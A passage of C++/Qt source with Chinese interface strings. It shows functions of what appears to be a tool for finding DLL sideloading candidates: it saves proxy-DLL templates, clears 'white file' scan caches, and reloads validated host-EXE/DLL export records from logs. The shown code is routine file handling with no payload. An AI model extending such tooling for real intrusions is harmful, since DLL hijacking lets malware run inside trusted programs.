        m_templateSource = m_templateEditor->toPlainText();
    }
    QDir().mkpath(QFileInfo(savedTemplatePath()).absolutePath());
    QFile file(savedTemplatePath());
    if (!file.open(QIODevice::WriteOnly | QIODevice::Text | QIODevice::Truncate)) {
        appendEvent(QStringLiteral("错误"), QStringLiteral("模板保存失败：%1").arg(savedTemplatePath()));
        return;
    }
    QTextStream out(&file);
    out.setEncoding(QStringConverter::Utf8);
    out << m_templateSource;
    if (m_templatePath) {
        m_templatePath->setText(savedTemplatePath());
    }
    appendEvent(QStringLiteral("模板"), QStringLiteral("模板已保存：%1").arg(savedTemplatePath()));
}

void MainWindow::clearCache()
{
    if (m_zeroEye.isRunning()) {
        m_scanStopRequested = true;
        m_zeroEye.stop();
        if (m_runScanButton) {
            m_runScanButton->setEnabled(true);
        }
        if (m_stopScanButton) {
            m_stopScanButton->setEnabled(false);
        }
        appendEvent(QStringLiteral("扫描"), QStringLiteral("已停止当前扫描任务。"));
    }
    if (m_validator.isRunning()) {
        appendEvent(QStringLiteral("提示"), QStringLiteral("验证正在运行，暂不能清理扫描缓存。"));
        return;
    }

    const QDir appDir(QCoreApplication::applicationDirPath());
    QSet<QString> protectedDirs;
    for (const VerifiedCandidate &candidate : std::as_const(m_verifiedCandidates)) {
        const QStringList paths{candidate.hostExe, candidate.dllPath, candidate.sourcePath};
        for (const QString &path : paths) {
            if (path.isEmpty()) {
                continue;
            }
            protectedDirs.insert(QFileInfo(path).absoluteDir().absolutePath());
        }
    }

    auto isProtected = [&protectedDirs](const QString &path) {
        const QString clean = QDir(path).absolutePath();
        for (const QString &protectedDir : protectedDirs) {
            if (clean == protectedDir
                || protectedDir.startsWith(clean + '/', Qt::CaseInsensitive)
                || clean.startsWith(protectedDir + '/', Qt::CaseInsensitive)) {
                return true;
            }
        }
        return false;
    };

    auto clearScanRoot = [&isProtected](const QString &rootPath) {
        QDir root(rootPath);
        if (!root.exists()) {
            return 0;
        }

        QStringList bundleDirs;
        QDirIterator it(rootPath, QDir::Dirs | QDir::NoDotAndDotDot, QDirIterator::Subdirectories);
        while (it.hasNext()) {
            const QString dirPath = it.next();
            if (QFileInfo::exists(QDir(dirPath).filePath("infos/Info.txt"))) {
                bundleDirs << dirPath;
            }
        }
        std::sort(bundleDirs.begin(), bundleDirs.end(), [](const QString &a, const QString &b) {
            return a.size() > b.size();
        });

        int removed = 0;
        for (const QString &dirPath : bundleDirs) {
            if (isProtected(dirPath)) {
                continue;
            }
            QDir dir(dirPath);
            if (dir.exists() && dir.removeRecursively()) {
                ++removed;
            }
        }
        return removed;
    };

    int removed = 0;
    removed += clearScanRoot(appDir.filePath("log/Whitebin"));
    removed += clearScanRoot(appDir.filePath("Eyebin"));
    removed += clearScanRoot(appDir.filePath("log/Extracted"));

    QDir workDir(appDir.filePath("log/Work"));
    if (workDir.exists() && workDir.removeRecursively()) {
        ++removed;
    }

    m_results->setRowCount(0);
    m_resultItems.clear();
    appendEvent(QStringLiteral("清理"), QStringLiteral("已清除扫描缓存，保留已验证可用导出函数的白文件目录。清理项：%1。").arg(removed));
}

void MainWindow::loadVerifiedCandidatesFromLog()
{
    const QString logRoot = QDir(QCoreApplication::applicationDirPath()).filePath("log");
    QDir root(logRoot);
    if (!root.exists()) {
        appendEvent(QStringLiteral("提示"), QStringLiteral("本地 log 文件夹不存在。"));
        return;
    }

    int loaded = 0;
    QDirIterator it(logRoot,
                    QStringList{"*_validated_proxy.cpp"},
                    QDir::Files,
                    QDirIterator::Subdirectories);
    while (it.hasNext()) {
        const QString sourcePath = it.next();
        QFile file(sourcePath);
        if (!file.open(QIODevice::ReadOnly | QIODevice::Text)) {
            continue;
        }

        const QString text = QString::fromUtf8(file.readAll());
        QString targetDllName;
        QStringList called;
        const auto lines = text.split(QRegularExpression("[\r\n]"), Qt::SkipEmptyParts);
        for (const QString &line : lines) {
            if (line.startsWith(QStringLiteral("// 目标 DLL:"))) {
                targetDllName = line.mid(QStringLiteral("// 目标 DLL:").size()).trimmed();
            } else if (line.startsWith(QStringLiteral("//   - "))) {
                called << line.mid(7).trimmed();
            }
        }
        called.removeDuplicates();
        if (called.isEmpty()) {
            continue;
        }

        const QFileInfo sourceInfo(sourcePath);
        const QString bundleDir = sourceInfo.absolutePath();
        ValidationJob job;
        job.hostExe = firstFileWithExtension(bundleDir, ".exe");
        job.dllPath = firstDllNamedOrWithExports(bundleDir, targetDllName);
        if (job.hostExe.isEmpty() || job.dllPath.isEmpty()) {
            continue;
        }
        job.label = QStringLiteral("%1 / %2")
            .arg(compactPath(job.hostExe), compactPath(job.dllPath));
        addVerifiedCandidate(job, called, sourcePath);
        ++loaded;
    }

    appendEvent(QStringLiteral("加载"), QStringLiteral("已从本地 log 载入 %1 条可用导出函数记录。").arg(loaded));
}

void MainWindow::setExports(const QVector<PeExportEntry> &exports)
{
    m_exportItems = exports;
}

void MainWindow::markCalledExports(const QStringList &called)
{
    Q_UNUSED(called);
}
